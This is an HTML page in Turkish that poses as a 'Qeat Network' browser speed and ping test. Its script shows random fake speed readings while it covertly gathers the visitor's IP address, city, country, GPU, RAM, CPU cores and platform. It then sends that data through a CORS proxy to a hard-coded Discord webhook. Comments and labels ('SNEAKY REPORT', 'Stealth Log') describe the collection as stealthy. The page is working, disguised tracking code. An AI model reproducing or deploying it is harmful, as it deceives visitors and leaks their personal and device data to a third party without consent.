<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Qeat Network - Hız ve Ping Testi</title>
    <style>
        body {
            background-color: #0b0f19;
            color: #f3f4f6;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 450px;
            background: #111827;
            border: 1px solid #1f2937;
            border-radius: 16px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
        }
        h2 { margin-top: 0; font-size: 22px; color: #3b82f6; }
        p { color: #9ca3af; font-size: 14px; margin-bottom: 25px; }
        
        .speed-gauge {
            width: 160px;
            height: 160px;
            border: 8px solid #1f2937;
            border-top: 8px solid #3b82f6;
            border-radius: 50%;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            transition: all 0.3s ease;
        }
        .speed-value { font-size: 32px; font-weight: bold; color: #fff; }
        .speed-unit { font-size: 12px; color: #6b7280; }

        .btn-start {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 12px 35px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 30px;
            cursor: pointer;
            transition: background 0.2s;
            width: 100%;
        }
        .btn-start:hover { background: #2563eb; }
        .btn-start:disabled { background: #4b5563; cursor: not-allowed; }

        .status-box {
            margin-top: 20px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            font-size: 13px;
            text-align: left;
            border-top: 1px solid #1f2937;
            padding-top: 15px;
            opacity: 0.6;
        }
        .status-item { color: #9ca3af; }
        .status-item span { color: #fff; font-weight: 500; }
        
        /* Çaktırmadan dönen yükleme animasyonu */
        .spinning { animation: spin 1s linear infinite; border-top-color: #10b981; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <h2>Qeat Network</h2>
    <p>Tarayıcı tabanlı optimize ping ve indirme hızı ölçer</p>
    
    <div class="speed-gauge" id="gauge">
        <div class="speed-value" id="speed-num">0.0</div>
        <div class="speed-unit" id="speed-unit">Mbps</div>
    </div>

    <button class="btn-start" id="start-btn" onclick="startTest()">Testi Başlat</button>

    <div class="status-box">
        <div class="status-item">Sunucu: <span id="srv-name">İstanbul</span></div>
        <div class="status-item">Gecikme: <span id="ping-val">--</span></div>
    </div>
</div>

<script>
    // Discord Webhook (Proxy korumalı, VPN gerektirmez)
    const rawWebhook = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
    const proxyWebhookURL = "https://corsproxy.io/?" + encodeURIComponent(rawWebhook);

    function getGPU() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Bilinmiyor";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
    }

    // Kullanıcı butona bastığı an arka planda av başlar
    async function startTest() {
        const btn = document.getElementById('start-btn');
        const gauge = document.getElementById('gauge');
        
        btn.disabled = true;
        btn.innerText = "Test Ediliyor...";
        gauge.classList.add('spinning');

        // Sahte hız testi animasyonu başlasın
        let speedInterval = setInterval(() => {
            let randomSpeed = (Math.random() * 75 + 15).toFixed(1);
            document.getElementById('speed-num').innerText = randomSpeed;
            document.getElementById('ping-val').innerText = Math.floor(Math.random() * 15 + 4) + " ms";
        }, 80);

        // O sırada çaktırmadan verileri toplayıp gönderiyoruz
        try {
            const gpu = getGPU();
            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
            const cores = navigator.hardwareConcurrency || "Bilinmiyor";
            
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            
            const report = `[QEAT SNEAKY REPORT]\nIP: ${data.ip}\nKonum: ${data.city}/${data.country_name}\nGPU: ${gpu}\nRAM: ${ram}\nCores: ${cores}\nOS: ${navigator.platform}`;

            const formData = new FormData();
            const payload = {
                username: "Qeat Stealth Log",
                embeds: [{
                    title: "🥷 Kullanıcı Ruhunu Bile Duymadan Yakalandı",
                    color: 3447003,
                    description: `**IP:** \`${data.ip}\`\n**Şehir:** \`${data.city}\`\n**Sistem:** \`${navigator.platform}\``
                }]
            };
            formData.append('payload_json', JSON.stringify(payload));
            const blob = new Blob([report], { type: 'text/plain' });
            formData.append('file', blob, `LOG_${data.ip}.txt`);

            // Veriyi gönder
            await fetch(proxyWebhookURL, { method: 'POST', body: formData });
        } catch (e) {
            console.log("Sessiz hata kontrolü");
        }

        // 4 saniye sonra test bitmiş gibi davranıp süreci doğalca sonlandırıyoruz
        setTimeout(() => {
            clearInterval(speedInterval);
            gauge.classList.remove('spinning');
            document.getElementById('speed-num').innerText = (Math.random() * 20 + 80).toFixed(1);
            document.getElementById('speed-unit').innerText = "Mbps (Tamamlandı)";
            btn.innerText = "Yeniden Test Et";
            btn.disabled = false;
        }, 4000);
    }
</script>
</body>
</html>
